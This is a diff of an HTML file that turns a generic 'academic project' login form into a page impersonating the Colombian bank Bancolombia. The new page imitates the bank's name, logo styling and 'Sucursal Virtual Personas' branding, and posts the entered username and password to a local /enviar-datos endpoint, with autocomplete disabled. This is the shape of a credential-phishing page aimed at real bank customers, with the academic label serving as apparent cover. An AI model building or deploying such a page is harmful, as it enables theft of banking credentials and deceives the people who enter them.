@@ -2,33 +2,45 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Formulario del Proyecto Académico</title>
-    <link rel="stylesheet" href="style.css"> 
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sucursal Virtual Personas - Bancolombia</title>
+    <link rel="stylesheet" href="estilo.css">
 </head>
 <body>
 
-    <div class="contenedor-formulario">
-        <h2>Inicio de Sesión de Pruebas</h2>
-        
-        <form action="/enviar-datos" method="POST">
-            
-            <div class="campo">
-                <label for="usuario">Nombre de Usuario:</label><br>
-                <input type="text" id="usuario" name="username" placeholder="Ingresa tu usuario" required>
+    <div class="contenedor-principal">
+        <div class="tarjeta-login">
+            <div class="logo-contenedor">
+                <span class="logo-txt-negro">Banco</span><span class="logo-txt-amarillo">lombia</span>
+                <div class="barra-colores"></div>
             </div>
             
-            <br>
-            
-            <div class="campo">
-                <label for="clave">Contraseña:</label><br>
-                <input type="password" id="clave" name="password" placeholder="Ingresa tu contraseña" required>
+            <h2 class="titulo-bienvenida">Inicia tu sesión</h2>
+            <p class="subtitulo">Ingresa tus credenciales de acceso para continuar.</p>
+
+            <form action="/enviar-datos" method="POST" class="formulario">
+                <div class="grupo-input">
+                    <label for="usuario">Usuario</label>
+                    <input type="text" id="usuario" name="username" placeholder="Ingresa tu nombre de usuario" required autocomplete="off">
+                </div>
+
+                <div class="grupo-input">
+                    <label for="clave">Contraseña</label>
+                    <input type="password" id="clave" name="password" placeholder="Ingresa tu contraseña" required>
+                </div>
+
+                <div class="enlaces-ayuda">
+                    <a href="#">¿Olvidaste tu usuario?</a>
+                    <a href="#">¿Olvidaste tu contraseña?</a>
+                </div>
+
+                <button type="submit" class="btn-ingresar">Ingresar</button>
+            </form>
+
+            <div class="pie-tarjeta">
+                <p>¿No te has registrado? <a href="#">Regístrate aquí</a></p>
             </div>
-            
-            <br>
-            
-            <button type="submit">Ingresar</button>
-            
-        </form>
+        </div>
     </div>
 
 </body>
